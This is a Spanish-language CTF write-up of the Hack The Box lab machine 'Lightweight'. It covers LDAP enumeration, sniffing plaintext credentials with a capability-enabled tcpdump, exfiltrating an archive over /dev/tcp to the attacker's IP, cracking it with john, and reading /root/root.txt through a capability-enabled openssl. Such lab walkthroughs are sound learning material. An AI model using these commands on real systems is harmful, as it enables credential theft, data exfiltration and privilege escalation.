---
layout: single
title: Lightweight - Hack The Box
excerpt: "Lightweight es una máquina en Linux de dificultad media en la cual debemos navegr en el entorno OpenLDAP para obtener el control de la máquina."
date: 2020-04-15
classes: wide
header:
  teaser: /assets/images/hack-the-box/lightweight_logo.png
  teaser_home_page: true
  icon: /assets/images/hack-the-box/hackthebox.webp
categories:
  - Hack-The-Box
  - Pentesting
tags:
  - LDAP
  - Tcpdump
  - Nmap
  - SSH
---

<p align="center">
<img src="/assets/images/hack-the-box/lightweight_logo.png">
</p>

Lightweight es una máquina en Linux de dificultad media en la cual debemos navegar en el entorno OpenLDAP para obtener el control de la máquina.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 lightweight.htb

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:
`nmap -p- --open -T5 -v -n lightweight.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```console
root@kali:/home/kali/Documents/HTB/Machines/Lightweight/nmap# nmap -p- --open -T5 -v -n lightweight.htb -oG all-ports
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-06 21:17 EDT
Initiating Ping Scan at 21:17
Scanning lightweight.htb (10.10.10.119) [4 ports]
Completed Ping Scan at 21:17, 0.21s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:17
Scanning lightweight.htb (10.10.10.119) [65535 ports]
Discovered open port 80/tcp on 10.10.10.119
Discovered open port 22/tcp on 10.10.10.119
Discovered open port 389/tcp on 10.10.10.119
Completed SYN Stealth Scan at 21:21, 241.66s elapsed (65535 total ports)
Nmap scan report for lightweight.htb (10.10.10.119)
Host is up (0.17s latency).
Not shown: 65532 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
389/tcp open  ldap
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p22,80,389 lightweight.htb -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```console
root@kali:/home/kali/Documents/HTB/Machines/Lightweight/nmap# nmap -sC -sV -p22,80,389 lightweight.htb -oN targeted.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-06 21:28 EDT
Nmap scan report for lightweight.htb (10.10.10.119)
Host is up (0.16s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time
```

Los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 22 (SSH Secure Shell):` sirve para acceder de manera remota a máquinas. SSH da una capa extra de seguridad usando mecanismo de cifrado y técnicas de criptografía que garantizan que las comunicaciones desde y hacia el servidor remoto sean cifradas.
- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.
- `Puerto 389 (LDAP):` protocolo de acceso ligero a directorios.

### Enumeración LDAP

Procedemos a realizar la enumeración de LDAP usando la herramienta `ldapsearch` la cual nos permite realizar consultas sobre los datos dentro de un directorios LDAP usando la linea de comandos. El comando a utilizar es el siguiente:
`ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb"`

- `-x:`  autenticación simple.
- `-h:` servidor LDAP.
- `-b:` especifica la base desde donde comienza la búsqueda.

Encontramos dos usuarios y sus correspondientes credenciales. El primero es `ldapuser1`:

```console
# ldapuser1, People, lightweight.htb
dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
uid: ldapuser1
cn: ldapuser1
sn: ldapuser1
mail: ldapuser1@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2R
 oai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1000
gidNumber: 1000
homeDirectory: /home/ldapuser1
```

Y el segundo usuario es `ldapuser2`:

```console
# ldapuser2, People, lightweight.htb
dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
uid: ldapuser2
cn: ldapuser2
sn: ldapuser2
mail: ldapuser2@lightweight.htb
objectClass: person
objectClass: organizationalPerson
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: top
objectClass: shadowAccount
userPassword:: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdms
 zYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
shadowLastChange: 17691
shadowMin: 0
shadowMax: 99999
shadowWarning: 7
loginShell: /bin/bash
uidNumber: 1001
gidNumber: 1001
homeDirectory: /home/ldapuser2
```

Ahora procedemos a a decodificar las contraseñas de los usuarios que se encuentran en base64. El comando para realizar esta tarea es el siguiente:

```console
echo e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x | base64 -d
```
El hash que se obtiene es el siguiente `{crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1`, sin embargo, el hash no se pudo crackear, así que se procede a revisar la página web.

### HTTP

Se procede a entrar al sitio web y en la página `user.php` nos informa que podemos acceder mediante SSH con la IP de nuestra máquina tanto en el campo de usuario como el contraseña.
`ssh 10.10.14.43@lightweight.htb`

Cuando se está enumerando los archivos de sistema de Linux se buscan archivos que se ejecuten con capabilities elevadas. Una capability es un privilegio que puede ser utilizado por un proceso para evitar ciertas verificaciones de permisos. Para esto utilizamos el siguiente comando  que examina las capabilities del usuario:
`getcap -r / 2>/dev/null`

- `-r:`  habilita la búsqueda recursiva.

La salida es la siguiente:

```console
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
```

Se observa que `tcpdump`, que es una herramienta para analizar el tráfico que circula en la red, tiene capacidades `cap_net_admin` y `cap_net_raw+ep` las cuales permite a un usuario regular capturar el tráfico en cualquier interfaz.



## Explotación

El siguiente comando permite interceptar el tráfico de todas las interfaces y guardamos la salida en el archivo `captura.pcap`. Para que se genere tráfico, entramos a la página `status.php` ya que se demora un poco en cargar y también se realiza un login vía ssh.
`tcpdump -i any -w captura.pcap` 

- `-i:` interfaz.
- `-w:`  escribir en el archivo.

Se procede a descargar el archivo `captura.pcap` vía scp que permite copiar archivos entre servidores de manera segura.
`scp 10.10.14.43@lightweight.htb:/home/10.10.14.43/captura.pcap ./`

Ahora con  Wireshark abrimos el archivo .pcap y como no se está utilizando LDAPS las credenciales se encuentran en texto plano.

Acto seguido, se realiza el login con el usuario `ldapuser2` y la contraseña encontrada en Wireshark.
`su -l ldapuser2`

Ya nos encontramos dentro del sistema así que solo nos queda abrir el archivo `user.txt` para copiar el hash.

```console
Last login: Fri Nov 16 22:41:31 GMT 2018 on pts/0
[ldapuser2@lightweight ~]$ pwd
/home/ldapuser2
[ldapuser2@lightweight ~]$ ls
backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
[ldapuser2@lightweight ~]$ cat user.txt 
8a866d..........................
```


## Escalamiento de privilegios

En el mismo directorio se encuentra un archivo `backup.7z`, sin embargo, al momento de extraerlo se encuentra protegido con contraseña.

Transferimos el archivo `backup.7z` usando netcat. Por la tanto, en nuestra máquina establecemos una conexión con netcat y lo dejamos a la escucha en el puerto 4444.

```console
root@kali:/home/kali/Documents/HTB/Machines/Lightweight/content# nc -lvnp 4444 >backup.7z
listening on [any] 4444 ...
```

Luego desde la máquina donde se encuentra el servidor LDAP escribimos el siguiente comando:

```console
[ldapuser2@lightweight ~]$ cat backup.7z > /dev/tcp/10.10.14.43/4444
```
Utilizamos `7z2john` para extraer el hash y luego crackearlo con `john`. Si sale el siguiente error al momento de utilizar el script `7z2john.pl` debemos clonar el repositorio que se encuentra en este [link](https://github.com/pmqs/Compress-Raw-Lzma) y seguir las instrucciones del `README.md`:

```console
Can't locate Compress/Raw/Lzma.pm in @INC (you may need to install the Compress::Raw::Lzma module) (@INC contains: /etc/perl /usr/local/lib/x86_64-linux-gnu/perl/5.30.0 /usr/local/share/perl/5.30.0 /usr/lib/x86_64-linux-gnu/perl5/5.30 /usr/share/perl5 /usr/lib/x86_64-linux-gnu/perl/5.30 /usr/share/perl/5.30 /usr/local/lib/site_perl /usr/lib/x86_64-linux-gnu/perl-base) at /usr/share/john/7z2john.pl line 6.
BEGIN failed--compilation aborted at /usr/share/john/7z2john.pl line 6.
```
para extraer el hash utilizamos el siguiente comando:
`/usr/share/john/7z2john.pl ../backup.7z > ../crack.hash`

Y luego procedemos a obtener la contraseña del archivo:

```console
root@kali:/home/kali/Documents/HTB/Machines/Lightweight/content# john -w=/usr/share/wordlists/rockyou.txt crack.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 128/128 AVX 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 12 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
delete           (backup.7z)
1g 0:00:08:28 DONE (2020-04-16 12:49) 0.001964g/s 4.039p/s 4.039c/s 4.039C/s slimshady..yomama
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Una vez descomprimido el archivo `backup.7z` y vemos que los archivos que tiene son los mismos que están en la página web del servidor `info.php`, `status.php`, `user.php`, `index.php` y `reset.php`.

El archivo `status.php` contiene las credenciales del usuario `ldapuser1`.

```php
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
```

Acto seguido, se realiza el login con el usuario `ldapuser1` y la contraseña encontrada en el archivo `status.php`.
`su -l ldapuser1`

Nuevamente revisamos las capabilities que tiene el usuario para revisar qué procesos están corriendo con privilegios.
`getcap -r / 2>/dev/null`

La salida es la siguiente:

```console
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/openssl =ep
```
`openssl` tiene la capability `ep` que significa que se puede leer y escribir cualquier cosa en el sistema de archivos. Por lo tanto, se puede leer la flag del root usando la función de codificación base64 en openssl y luego de decodificar el archivo.

```console
[ldapuser1@lightweight ~]$ ./openssl base64 -in /root/root.txt -out ./root.txt.b64
[ldapuser1@lightweight ~]$ ls
capture.pcap  ldapTLS.php  openssl  root.txt.b64  tcpdump
[ldapuser1@lightweight ~]$ base64 -d root.txt.b64 
f1d4e3..........................
```
